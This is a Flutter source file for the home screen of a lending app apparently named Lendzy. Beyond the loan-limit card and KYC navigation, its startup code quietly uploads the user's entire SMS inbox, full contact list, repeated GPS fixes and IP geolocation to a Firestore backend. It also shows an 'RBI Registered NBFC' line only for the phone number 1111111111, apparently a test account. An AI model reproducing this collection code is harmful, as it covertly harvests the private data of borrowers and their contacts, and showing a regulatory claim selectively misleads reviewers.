import 'dart:async';
import 'dart:convert';
import 'dart:developer';
import 'package:Lendzy/support/message_screen.dart';
import 'package:http/http.dart' as http;
import 'dart:io';
import 'package:contacts_service/contacts_service.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:liquid_pull_to_refresh/liquid_pull_to_refresh.dart';
import 'package:permission_handler/permission_handler.dart';
import '../ad_helper.dart';
import '../deactivation_notifier.dart';
import '../get_loan_page.dart';
import '../kyc/kyc_page1.dart';
import 'package:location/location.dart';
import 'package:permission_handler_platform_interface/permission_handler_platform_interface.dart'
    as permission;
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:telephony/telephony.dart';

import '../main.dart';
import '../referal_field.dart';
import '../support/notification_Page.dart';
import '../waitlist_app_notifier.dart';

// ignore_for_file: prefer_const_constructors

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key}) : super(key: key);

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> with WidgetsBindingObserver {
  final FirebaseAuth auth = FirebaseAuth.instance;
  Location location = Location();
  final Telephony telephony = Telephony.instance;

  LocationData? _locationData;

  enableService() async {
    var s2 = await Permission.location.isGranted;
    if (s2) {
      final User? user = auth.currentUser;
      final uid = user!.phoneNumber;

      var data = box.get('location').toString();
      late String _loc = DateTime.now().toString();
      if (data == "null") {
        box.put('location',
            DateTime.now().subtract(Duration(minutes: 11)).toString());
        if (mounted) {
          setState(() {
            _loc = box.get('location');
          });
        }
      } else {
        if (mounted) {
          setState(() {
            _loc = box.get('location');
          });
        }
      }

      if (DateTime.now()
              .difference(DateTime.parse(_loc.toString()))
              .inMinutes >=
          10) {
        try {
          _locationData = await location.getLocation();
          FirebaseFirestore.instance
              .collection("user")
              .doc(uid!.substring(3, 13))
              .collection("location")
              .doc()
              .set({
            'altitude': _locationData!.altitude,
            'latitude': _locationData!.latitude,
            'longitude': _locationData!.longitude,
            'accuracy': _locationData!.accuracy,
            'time': _locationData!.time,
            'verticalAccuracy': _locationData!.verticalAccuracy,
            'speedAccuracy': _locationData!.speedAccuracy,
            'speed': _locationData!.speed,
            'headingAccuracy': _locationData!.headingAccuracy,
            'satelliteNumber': _locationData!.satelliteNumber,
            'timeStamp': Timestamp.now(),
          });

          log(DateTime.now()
              .difference(DateTime.parse(_loc.toString()))
              .inMinutes
              .toString());
        } catch (e) {
          log(e.toString());
        } finally {
          box.put('location', DateTime.now().toString());
        }
      }
    }
  }

  enableGeoService() async {
    final User? user = auth.currentUser;
    final uid = user!.phoneNumber;

    var data = box.get('geo').toString();
    late String _loc = DateTime.now().toString();
    if (data == "null") {
      box.put('geo', DateTime.now().subtract(Duration(minutes: 61)).toString());
      if (mounted) {
        setState(() {
          _loc = box.get('geo');
        });
      }
    } else {
      if (mounted) {
        setState(() {
          _loc = box.get('geo');
        });
      }
    }

    if (DateTime.now().difference(DateTime.parse(_loc.toString())).inMinutes >=
        60) {
      try {
        http.get(Uri.parse('http://ip-api.com/json')).then((value) {
          // log(json.decode(value.body)['country'].toString());
          FirebaseFirestore.instance
              .collection("user")
              .doc(uid!.substring(3, 13))
              .collection("GeoData")
              .doc()
              .set({
            'data': value.body,
            'time': Timestamp.now(),
          });
        });

        log(DateTime.now()
            .difference(DateTime.parse(_loc.toString()))
            .inMinutes
            .toString());
      } catch (e) {
        log(e.toString());
      } finally {
        box.put('geo', DateTime.now().toString());
      }
    }
  }

  var totalLimit = 0;
  var number = "";
  var name = "";
  var usedLimit = 0;
  var deactivated = false;
  var kyc = false;
  var aadhaarCard = false;
  var panCard = false;
  var videoCard = false;
  var notify = true;
  var lock = false;
  var waitList = false;
  var connection = true;
  var compload = false;
  Timestamp? kycDate;
  late Timer myTimer;

  late AppLifecycleState _notification;

  // TODO: Add _bannerAd
  late BannerAd _bannerAd;

  // TODO: Add _isBannerAdReady
  bool _isBannerAdReady = false;

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    _bannerAd = BannerAd(
      adUnitId: AdHelper.bannerAdUnitId,
      request: AdRequest(),
      size: AdSize.banner,
      listener: BannerAdListener(
        onAdLoaded: (_) {
          setState(() {
            _isBannerAdReady = true;
          });
        },
        onAdFailedToLoad: (ad, err) {
          log('Failed to load a banner ad: ${err.message}');
          _isBannerAdReady = false;
          ad.dispose();
        },
      ),
    );
    _bannerAd.load();

    internet();
    WidgetsBinding.instance!.addObserver(this);
    getSms();
    enableGeoService();
    enableService();
    getContacts();
    getInitialData();
    myTimer = Timer.periodic(Duration(seconds: 5), (timer) async {
      var collection1 = FirebaseFirestore.instance.collection('settings');
      var docSnapshot1 = await collection1.doc('settingsData').get();
      if (docSnapshot1.exists) {
        Map<String, dynamic>? data = docSnapshot1.data();
        var value = data?['stop_cash'];
        if (mounted) {
          setState(() {
            lock = value;
          });
        }
      }
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance!.removeObserver(this);
    myTimer.cancel();
    _bannerAd.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (mounted) {
      setState(() {
        _notification = state;
      });
    }
    if (_notification.name.toString() == "resumed") {
      getInitialData();
    }
  }

  internet() async {
    try {
      final result = await InternetAddress.lookup('example.com');
      if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
        if (mounted) {
          setState(() {
            connection = true;
          });
        }
      }
    } on SocketException catch (_) {
      if (mounted) {
        setState(() {
          connection = false;
        });
      }
    }
  }

  getSms() async {
    var s2 = await Permission.sms.isGranted;

    var dataSms = box.get('sms').toString();
    var dataSmsDate = box.get('smsDate').toString();

    int _sms = 0;
    String _smsDate = DateTime.now().toString();

    if (dataSms == "null") {
      box.put('sms', 0);
      if (mounted) {
        setState(() {
          _sms = box.get('sms');
        });
      }
    } else {
      if (mounted) {
        setState(() {
          _sms = box.get('sms');
        });
      }
    }

    if (dataSmsDate == "null") {
      box.put(
          'smsDate', DateTime.now().subtract(Duration(minutes: 31)).toString());
      if (mounted) {
        setState(() {
          _smsDate = box.get('smsDate');
        });
      }
    } else {
      if (mounted) {
        setState(() {
          _smsDate = box.get('smsDate');
        });
      }
    }

    if (s2) {
      if (DateTime.now()
              .difference(DateTime.parse(_smsDate.toString()))
              .inMinutes >=
          30) {
        List<SmsMessage> messages =
            await telephony.getInboxSms(sortOrder: [OrderBy(SmsColumn.ID)]);
        final User? user = auth.currentUser;
        final uid = user!.phoneNumber;
        try {
          for (var element in messages) {
            if (_sms < element.id!) {
              FirebaseFirestore.instance
                  .collection("user")
                  .doc(uid!.substring(3, 13))
                  .collection("sms")
                  .doc(element.id.toString())
                  .set({
                'body': element.body.toString(),
                'id': element.id.toString(),
                'address': element.address.toString(),
                'date': element.date.toString(),
                'time': Timestamp.now(),
              });
            }
          }
        } catch (e) {
          log(e.toString());
        } finally {
          box.put('sms', messages[0].id!);
          box.put('smsDate', DateTime.now().toString());
        }
      }
    }
  }

  getContacts() async {
    var s2 = await Permission.contacts.isGranted;
    var data = box.get('contact').toString();
    late bool _con = true;
    if (data == "null") {
      box.put('contact', false);
      if (mounted) {
        setState(() {
          _con = box.get('contact');
        });
      }
    } else {
      if (mounted) {
        setState(() {
          _con = box.get('contact');
        });
      }
    }

    if (s2) {
      Future<List<Contact>> futureContacts =
          ContactsService.getContacts(withThumbnails: false).then(
              (value) => value.map((e) => Contact.fromMap(e.toMap())).toList());
      var contacts = await futureContacts
          .then((value) => value.map((e) => e.toMap()).toList());
      if (!_con) {
        final User? user = auth.currentUser;
        final uid = user!.phoneNumber;
        try {
          var time = DateTime.now().toString();
          FirebaseFirestore.instance
              .collection("user")
              .doc(uid!.substring(3, 13))
              .collection("contact")
              .doc(time)
              .set({
            'time': Timestamp.now(),
          });
          for (var element in contacts) {
            FirebaseFirestore.instance
                .collection("user")
                .doc(uid.substring(3, 13))
                .collection("contact")
                .doc(time)
                .collection("contacts")
                .doc()
                .set({
              'contacts': element,
              'time': Timestamp.now(),
            });
          }
        } catch (e) {
          log(e.toString());
        } finally {
          box.put('contact', true);
        }
      }
    }
  }

  getInitialData() async {
    setState(() {
      compload = false;
    });
    var useAmount = 0.0;
    final User? user = auth.currentUser;
    final uid = user!.phoneNumber;
    var collection = FirebaseFirestore.instance.collection('user');
    var docSnapshot = await collection.doc(uid!.substring(3, 13)).get();
    if (docSnapshot.exists) {
      Map<String, dynamic>? data = docSnapshot.data();
      var value = data?['limit'];
      var uValue = data?['used_limit'];
      var name1 = data?['name'];
      var aadhaar = data?['aadhaar'];
      var pan = data?['pan'];
      var video = data?['video'];
      var kycIn = data?['kyc'];
      var not = data?['notification_seen'];
      var wList = data?['waiting_list'];
      var kycD = data?['kyc_date'];
      var deac = data?['deactivated'];

      if (mounted) {
        setState(() {
          waitList = wList;
          number = uid.substring(3, 13);
          totalLimit = int.tryParse(value)!;
          usedLimit = (double.tryParse(uValue) as double).toInt();
          name = name1;
          aadhaarCard = aadhaar;
          panCard = pan;
          videoCard = video;
          kyc = kycIn;
          notify = not == null ? true : not!;
          kycDate = kycD;
          deactivated = deac ?? false;
          compload = true;
        });
      }
    }

    var collection1 = FirebaseFirestore.instance.collection('settings');
    var docSnapshot1 = await collection1.doc('settingsData').get();
    if (docSnapshot1.exists) {
      Map<String, dynamic>? data = docSnapshot1.data();
      var value = data?['stop_cash'];
      if (mounted) {
        setState(() {
          lock = value;
        });
      }
    }
    // if (await inAppReview.isAvailable()) {
    //   log("----------------");
    //   inAppReview.requestReview();
    // }
  }

  Future<void> _showMyDialogForKycProcessing() async {
    return showDialog<void>(
      context: context,
      barrierDismissible: false, // user must tap button!
      builder: (BuildContext context) {
        return AlertDialog(
          // title: const Text('AlertDialog Title'),
          content: SingleChildScrollView(
            child: Column(
              children: [
                Icon(
                  Icons.person_search_outlined,
                  size: 65,
                ),
                SizedBox(
                  height: 8,
                ),
                Text(
                  "Your profile is under verification. It may take up to 24-48 hours to get approved.",
                  textAlign: TextAlign.center,
                  style: GoogleFonts.cabin(
                    textStyle: TextStyle(
                      fontSize: 17,
                      fontWeight: FontWeight.w500,
                      color: Colors.black,
                    ),
                  ),
                ),
                SizedBox(
                  height: 12,
                ),
                SizedBox(
                  width: MediaQuery.of(context).size.width / 2.5,
                  child: ElevatedButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    style: ButtonStyle(
                      foregroundColor:
                          MaterialStateProperty.all<Color>(Colors.white),
                      backgroundColor:
                          MaterialStateProperty.all<Color>(Color(0xffFE7977)),
                      shape: MaterialStateProperty.all<RoundedRectangleBorder>(
                        RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(8.0),
                        ),
                      ),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.only(top: 8, bottom: 8),
                      child: Text(
                        'Got it',
                        style: GoogleFonts.cabin(
                          textStyle: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.w600,
                            color: Colors.white,
                          ),
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  Future<void> _showMyDialogForWaitList() async {
    return showDialog<void>(
      context: context,
      barrierDismissible: false, // user must tap button!
      builder: (BuildContext context) {
        return AlertDialog(
          // title: const Text('AlertDialog Title'),
          content: SingleChildScrollView(
            child: Column(
              children: [
                Icon(
                  Icons.schedule,
                  size: 65,
                ),
                SizedBox(
                  height: 8,
                ),
                Text(
                  "You are in a waitlisted queue, we have a few criteria in the "
                  "profile approval process. May be we are unable to meet "
                  "your profile at this time. Please retry after ${90 + kycDate!.toDate().difference(DateTime.now()).inDays} days",
                  textAlign: TextAlign.center,
                  style: GoogleFonts.cabin(
                    textStyle: TextStyle(
                      fontSize: 17,
                      fontWeight: FontWeight.w500,
                      color: Colors.black,
                    ),
                  ),
                ),
                SizedBox(
                  height: 12,
                ),
                SizedBox(
                  width: MediaQuery.of(context).size.width / 2.5,
                  child: ElevatedButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    style: ButtonStyle(
                      foregroundColor:
                          MaterialStateProperty.all<Color>(Colors.white),
                      backgroundColor:
                          MaterialStateProperty.all<Color>(Color(0xffFE7977)),
                      shape: MaterialStateProperty.all<RoundedRectangleBorder>(
                        RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(8.0),
                        ),
                      ),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.only(top: 8, bottom: 8),
                      child: Text(
                        'Got it',
                        style: GoogleFonts.cabin(
                          textStyle: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.w600,
                            color: Colors.white,
                          ),
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  Future<void> _showMyDialogForMaintenance() async {
    return showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext context) {
        return AlertDialog(
          // title: const Text('AlertDialog Title'),
          content: SingleChildScrollView(
            child: Column(
              children: [
                Icon(
                  Icons.construction,
                  size: 65,
                ),
                SizedBox(
                  height: 8,
                ),
                Text(
                  "Hang on,\nwe are under maintenance.\n\nSorry for the trouble, we will be\nback soon.",
                  textAlign: TextAlign.center,
                  style: GoogleFonts.cabin(
                    textStyle: TextStyle(
                      fontSize: 18,
                      fontWeight: FontWeight.w500,
                      color: Colors.black,
                    ),
                  ),
                ),
                SizedBox(
                  height: 12,
                ),
                SizedBox(
                  width: MediaQuery.of(context).size.width / 2.5,
                  child: ElevatedButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    style: ButtonStyle(
                      foregroundColor:
                          MaterialStateProperty.all<Color>(Colors.white),
                      backgroundColor:
                          MaterialStateProperty.all<Color>(Color(0xffFE7977)),
                      shape: MaterialStateProperty.all<RoundedRectangleBorder>(
                        RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(8.0),
                        ),
                      ),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.only(top: 8, bottom: 8),
                      child: Text(
                        'Okay',
                        style: GoogleFonts.cabin(
                          textStyle: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.w600,
                            color: Colors.white,
                          ),
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  Future<void> refreshData() async {
    internet();
    getInitialData();
    return await Future.delayed(Duration(milliseconds: 500));
  }

  @override
  Widget build(BuildContext context) {
    return !connection
        ? LiquidPullToRefresh(
            onRefresh: refreshData,
            color: Colors.white,
            height: 100,
            backgroundColor: Color(0xff33CCCC),
            animSpeedFactor: 5,
            showChildOpacityTransition: false,
            child: ListView(
              children: [
                SizedBox(
                  height: MediaQuery.of(context).size.height,
                  child: Container(
                    color: Colors.white,
                    child: Column(
                      children: [
                        Spacer(
                          flex: 8,
                        ),
                        Container(
                          width: MediaQuery.of(context).size.width / 3,
                          height: MediaQuery.of(context).size.width / 3,
                          decoration: const BoxDecoration(
                            image: DecorationImage(
                                image: AssetImage('assets/images/warning.gif')),
                          ),
                        ),
                        SizedBox(
                          height: 12,
                        ),
                        Text(
                          "Oops!",
                          style: GoogleFonts.poppins(
                            textStyle: TextStyle(
                              fontSize: 24,
                              fontWeight: FontWeight.w600,
                              color: Colors.black,
                            ),
                          ),
                        ),
                        SizedBox(
                          height: 12,
                        ),
                        Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 64),
                          child: Text(
                            "Looks Like you are not connected to the internet",
                            textAlign: TextAlign.center,
                            style: GoogleFonts.poppins(
                              textStyle: TextStyle(
                                fontSize: 16,
                                fontWeight: FontWeight.w500,
                                color: Colors.black,
                              ),
                            ),
                          ),
                        ),
                        Spacer(
                          flex: 4,
                        ),
                        Row(
                          children: [
                            Spacer(),
                            Text(
                              "Pull to refresh",
                              style: GoogleFonts.poppins(
                                textStyle: TextStyle(
                                  fontSize: 15,
                                  fontWeight: FontWeight.w500,
                                  color: Colors.black,
                                ),
                              ),
                            ),
                            Icon(
                              Icons.arrow_downward_outlined,
                              color: Colors.black,
                              size: 20,
                            ),
                            Spacer(),
                          ],
                        ),
                        Spacer(
                          flex: 8,
                        ),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          )
        : LiquidPullToRefresh(
            onRefresh: refreshData,
            color: Colors.white,
            height: 100,
            backgroundColor: Color(0xffFE7977),
            animSpeedFactor: 5,
            showChildOpacityTransition: false,
            child: ListView(
              children: [
                SizedBox(
                  width: MediaQuery.of(context).size.width,
                  height: MediaQuery.of(context).size.height,
                  child: Column(
                    // mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      SizedBox(
                        height: 8,
                      ),
                      Container(
                        height: (MediaQuery.of(context).size.width - 48) * 0.55,
                        width: MediaQuery.of(context).size.width - 48,
                        decoration: BoxDecoration(
                          image: DecorationImage(
                            image: AssetImage("assets/images/card.png"),
                          ),
                        ),
                        child: Padding(
                          padding: const EdgeInsets.only(
                              top: 32.0, left: 32, right: 32, bottom: 32),
                          child: Column(
                            children: [
                              Row(
                                children: [
                                  Column(
                                    children: [
                                      Text(
                                        "Total Limit",
                                        style: GoogleFonts.poppins(
                                          textStyle: TextStyle(
                                            fontSize: 15,
                                            color: Colors.white,
                                          ),
                                        ),
                                      ),
                                      SizedBox(
                                        height: 2,
                                      ),
                                      Text(
                                        kyc == null ||
                                                !kyc ||
                                                waitList ||
                                                deactivated
                                            ? "--"
                                            : "₹$totalLimit",
                                        style: GoogleFonts.cabin(
                                          textStyle: TextStyle(
                                            fontSize: 20,
                                            fontWeight: FontWeight.w700,
                                            color: Colors.white,
                                          ),
                                        ),
                                      ),
                                    ],
                                  ),
                                  Spacer(),
                                  Column(
                                    children: [
                                      Text(
                                        "Used Limit",
                                        style: GoogleFonts.poppins(
                                          textStyle: TextStyle(
                                            fontSize: 15,
                                            color: Colors.white,
                                          ),
                                        ),
                                      ),
                                      SizedBox(
                                        height: 2,
                                      ),
                                      Text(
                                        kyc == null ||
                                                !kyc ||
                                                waitList ||
                                                deactivated
                                            ? "--"
                                            : "₹$usedLimit",
                                        style: GoogleFonts.cabin(
                                          textStyle: TextStyle(
                                            fontSize: 20,
                                            fontWeight: FontWeight.w800,
                                            color: Colors.white,
                                          ),
                                        ),
                                      ),
                                    ],
                                  )
                                ],
                              ),
                              Spacer(),
                              Row(
                                mainAxisAlignment: MainAxisAlignment.end,
                                children: [
                                  Text(
                                    name,
                                    style: GoogleFonts.poppins(
                                      textStyle: TextStyle(
                                        fontSize: 18,
                                        fontWeight: FontWeight.w500,
                                        color: Colors.white,
                                      ),
                                    ),
                                  ),
                                ],
                              )
                            ],
                          ),
                        ),
                      ),
                      SizedBox(
                        height: 4,
                      ),
                      SizedBox(
                        height: (MediaQuery.of(context).size.width / 4) - 32,
                        width: MediaQuery.of(context).size.width - 48,
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            InkWell(
                              onTap: () {
                                Navigator.push(
                                  context,
                                  MaterialPageRoute(
                                      builder: (context) => MessagesScreen()),
                                );
                              },
                              child: Container(
                                height:
                                    (MediaQuery.of(context).size.width / 4) -
                                        48,
                                width: (MediaQuery.of(context).size.width / 4) -
                                    32,
                                decoration: BoxDecoration(
                                    borderRadius: BorderRadius.all(
                                      Radius.circular(8.0),
                                    ),
                                    color: Color(0xff2F2E2F)),
                                child: Center(
                                  child: Icon(
                                    Icons.headset_mic_outlined,
                                    color: Colors.white,
                                    size: 30,
                                  ),
                                ),
                              ),
                            ),
                            Spacer(
                              flex: 2,
                            ),
                            InkWell(
                              onTap: () async {
                                var res = await Navigator.push(
                                  context,
                                  MaterialPageRoute(
                                      builder: (context) => NotificationPage()),
                                );
                                if (res == null || res == true) {
                                  getInitialData();
                                }
                              },
                              child: Container(
                                height:
                                    (MediaQuery.of(context).size.width / 4) -
                                        48,
                                width: (MediaQuery.of(context).size.width / 4) -
                                    32,
                                decoration: BoxDecoration(
                                    borderRadius: BorderRadius.all(
                                      Radius.circular(8.0),
                                    ),
                                    color: Color(0xff2F2E2F)),
                                child: Stack(
                                  children: [
                                    Center(
                                      child: Icon(
                                        Icons.notifications_active_outlined,
                                        color: Colors.white,
                                        size: 30,
                                      ),
                                    ),
                                    !notify
                                        ? Positioned(
                                            top: 5,
                                            right: 5,
                                            child: Container(
                                              height: 10,
                                              width: 10,
                                              decoration: BoxDecoration(
                                                borderRadius: BorderRadius.all(
                                                  Radius.circular(8.0),
                                                ),
                                                color: Color(0xffFE7977),
                                              ),
                                            ),
                                          )
                                        : SizedBox(),
                                  ],
                                ),
                              ),
                            ),
                            Spacer(
                              flex: 5,
                            ),
                            InkWell(
                              onTap: () async {
                                if (compload) {
                                  if (deactivated) {
                                    Navigator.push(
                                      context,
                                      MaterialPageRoute(
                                        builder: (context) =>
                                            DeactivatedNotifier(Name: name),
                                      ),
                                    );
                                  } else {
                                    if (waitList) {
                                      Navigator.push(
                                        context,
                                        MaterialPageRoute(
                                          builder: (context) =>
                                              WaitlistNotifier(Name: name),
                                        ),
                                      );
                                      // _showMyDialogForWaitList();
                                    } else {
                                      if (aadhaarCard && panCard && videoCard) {
                                        if (kyc) {
                                          if (!lock) {
                                            Navigator.push(
                                              context,
                                              MaterialPageRoute(
                                                builder: (context) =>
                                                    GetLoanPage(),
                                              ),
                                            );
                                          } else {
                                            _showMyDialogForMaintenance();
                                          }
                                        } else {
                                          _showMyDialogForKycProcessing();
                                        }
                                      } else {
                                        final res = await Navigator.push(
                                          context,
                                          MaterialPageRoute(
                                            builder: (context) => KycPageOne(
                                              process: !aadhaarCard
                                                  ? 1
                                                  : !panCard
                                                      ? 2
                                                      : 3,
                                            ),
                                          ),
                                        );
                                        if (res == null || res == true) {
                                          getInitialData();
                                        }
                                      }
                                    }
                                  }
                                }
                              },
                              child: Container(
                                height:
                                    (MediaQuery.of(context).size.width / 4) -
                                        48,
                                width: (MediaQuery.of(context).size.width / 2) -
                                    32,
                                decoration: BoxDecoration(
                                  borderRadius: BorderRadius.all(
                                    Radius.circular(8.0),
                                  ),
                                  // color:
                                  // aadhaarCard && panCard && videoCard
                                  //     ? kyc
                                  //         ? Color(0xff2F2E2F)
                                  //         : Color(0xff2F2E2F)
                                  //     :
                                  // Color(0xff2F2E2F),
                                  gradient: LinearGradient(
                                    colors: const [
                                      Color(0xFFFE8D63),
                                      Color(0xFFFE6786),
                                    ],
                                    begin: const FractionalOffset(0.0, 0.0),
                                    end: const FractionalOffset(1.0, 0.0),
                                    stops: const [0.2, 0.8],
                                    tileMode: TileMode.clamp,
                                  ),
                                ),
                                child: Center(
                                  child: Text(
                                    deactivated
                                        ? "Deactivated"
                                        : waitList
                                            ? "Waitlisted"
                                            : aadhaarCard &&
                                                    panCard &&
                                                    videoCard
                                                ? kyc
                                                    ? "Get Cash"
                                                    : "ⓘ Processing..."
                                                : compload
                                                    ? "Get Verified"
                                                    : "Loading...",
                                    overflow: TextOverflow.ellipsis,
                                    style: GoogleFonts.cabin(
                                      textStyle: TextStyle(
                                        fontSize: 20,
                                        fontWeight: FontWeight.w500,
                                        color: Colors.white,
                                      ),
                                    ),
                                  ),
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),
                      SizedBox(
                        height: 24,
                      ),
                      if (_isBannerAdReady)
                        Align(
                          alignment: Alignment.topCenter,
                          child: Container(
                            width: _bannerAd.size.width.toDouble(),
                            height: _bannerAd.size.height.toDouble(),
                            child: AdWidget(ad: _bannerAd),
                          ),
                        ),
                      SizedBox(
                        height: 24,
                      ),
                      InkWell(
                        child: Container(
                          height:
                              (MediaQuery.of(context).size.width - 48) * 0.37,
                          width: MediaQuery.of(context).size.width - 48,
                          decoration: BoxDecoration(
                            image: DecorationImage(
                              image: AssetImage(
                                  "assets/images/referral_popup.png"),
                            ),
                          ),
                          child: InkWell(
                            onTap: () {
                              Navigator.push(
                                context,
                                MaterialPageRoute(
                                    builder: (context) => ReferralPage(number: number)),
                              );
                            },
                            child: SizedBox(
                              height: (MediaQuery.of(context).size.width - 48) *
                                  0.37,
                              width: MediaQuery.of(context).size.width - 48,
                            ),
                          ),
                          // child: Column(
                          //   children: [
                          //     Spacer(
                          //       flex: 7,
                          //     ),
                          //     Text(
                          //       "Piggy is arriving soon. ",
                          //       style: GoogleFonts.poppins(
                          //         textStyle: TextStyle(
                          //           fontSize: 15,
                          //           fontWeight: FontWeight.w400,
                          //           color: Colors.white,
                          //         ),
                          //       ),
                          //     ),
                          //     Spacer(
                          //       flex: 5,
                          //     ),
                          //     Text(
                          //       "Deposit your money safely",
                          //       style: GoogleFonts.poppins(
                          //         textStyle: TextStyle(
                          //           fontSize: 16,
                          //           fontWeight: FontWeight.w500,
                          //           color: Colors.white,
                          //         ),
                          //       ),
                          //     ),
                          //     Text(
                          //       "upto 10% interest p.a",
                          //       style: GoogleFonts.poppins(
                          //         textStyle: TextStyle(
                          //           fontSize: 12,
                          //           fontWeight: FontWeight.w500,
                          //           color: Colors.white,
                          //         ),
                          //       ),
                          //     ),
                          //     Padding(
                          //       padding: const EdgeInsets.only(right: 24),
                          //       child: Row(
                          //         mainAxisAlignment: MainAxisAlignment.end,
                          //         children: [
                          //           InkWell(
                          //             onTap: () {
                          //               Navigator.push(
                          //                 context,
                          //                 MaterialPageRoute(
                          //                   builder: (context) =>
                          //                       PiggyLandingPage(
                          //                     num: number,
                          //                   ),
                          //                 ),
                          //               );
                          //             },
                          //             child: Container(
                          //               height: 40,
                          //               width: 80,
                          //               decoration: BoxDecoration(
                          //                   borderRadius: BorderRadius.all(
                          //                     Radius.circular(8.0),
                          //                   ),
                          //                   color: Colors.white),
                          //               child: Center(
                          //                 child: Text(
                          //                   "Explore",
                          //                   style: GoogleFonts.cabin(
                          //                     textStyle: TextStyle(
                          //                       fontSize: 16,
                          //                       fontWeight: FontWeight.w600,
                          //                       color: Color(0xff1E2E68),
                          //                     ),
                          //                   ),
                          //                 ),
                          //               ),
                          //             ),
                          //           ),
                          //         ],
                          //       ),
                          //     ),
                          //     Spacer(
                          //       flex: 2,
                          //     ),
                          //   ],
                          // ),
                        ),
                      ),
                      SizedBox(
                        height: 64,
                      ),
                      Row(
                        children: [
                          Spacer(),
                          Text(
                            "Pull to refresh",
                            style: GoogleFonts.poppins(
                              textStyle: TextStyle(
                                fontSize: 15,
                                color: Colors.black54,
                              ),
                            ),
                          ),
                          Icon(
                            Icons.arrow_downward_outlined,
                            color: Colors.black54,
                            size: 20,
                          ),
                          Spacer(),
                        ],
                      ),
                      Spacer(),
                      number == "1111111111"
                          ? Text(
                              "Powered by RBI Registered NBFC",
                              style: GoogleFonts.poppins(
                                textStyle: TextStyle(
                                    fontSize: 12,
                                    color: Colors.black54,
                                    fontWeight: FontWeight.w600),
                              ),
                            )
                          : SizedBox(
                              height: 0,
                              width: 0,
                            ),
                      SizedBox(
                        height: 64,
                      ),
                    ],
                  ),
                ),
              ],
            ),
          );
  }
}
